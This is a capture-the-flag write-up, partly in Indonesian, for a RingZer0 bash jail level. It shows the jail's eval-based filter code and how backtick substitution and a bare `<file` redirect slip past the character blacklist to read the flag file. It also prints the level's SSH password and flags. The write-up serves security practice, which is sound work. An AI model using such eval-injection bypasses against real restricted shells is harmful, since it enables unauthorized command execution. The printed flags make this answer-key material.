# soal
User: level2 \
Password is the previous jail challenge flag \
ssh://challenges.ringzer0ctf.com:10219

# setup
```bash
ssh level2@challenges.ringzer0ctf.com -p 10219
# pass: FLAG-U96l4k6m72a051GgE5EN0rA85499172K

RingZer0 Team Online CTF

BASH Jail Level 2:
Current user is uid=2002(level2) gid=2002(level2) groups=2002(level2),1000(challenger)

Flag is located at /home/level2/flag.txt

Challenge bash code:
-----------------------------

function check_space {
        if [[ $1 == *[bdks';''&'' ']* ]]
        then
                return 0
        fi

        return 1
}

while :
do
        echo "Your input:"
        read input
        if check_space "$input"
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output="echo Your command is: $input"
                eval $output
        fi
done

-----------------------------
Your input:
```

# solve
```bash
Your input:
$((1++1))
# Your command is: 2
Your input: 
"whoami"
# Your command is: whoami
Your input:
'whoami'
# Your command is: whoami
Your input:
`whoami`
# Your command is: level2
Your input:
`/home/level2/flag.txt`
# /home/level2/prompt.sh: line 38: /home/level2/flag.txt: Permission denied
# Your command is:
Your input:
`</home/level2/flag.txt`
# Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P

## jika kita lihat di awal perintah dalam shell ini setiap perinath yang dikeluarkan akan menghasillkan nama perintah yang digunakan
## ketika kita memasukan whoami maka perintahnya whoami
## dan karena spasi diblokir kita tidak bisa menggunakan cat
## jadi saya coba merun dengan kutip "", '', `` dan ketika dicoba dengan `` dia berhasil menampilkan output

## penggunakan eval dan < itu mirip seperti ini
cat teks
# ls;
# ARIAFATAH

eval `</home/ariafatah/teks`
# Document  Download  ai-folio  cyber_nexus  docker_aria  kube_aria  learn  over  picoctf  podman_aria  snap  teks  tok  trash
# ARIAFATAH: command not found
```

# flag
FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P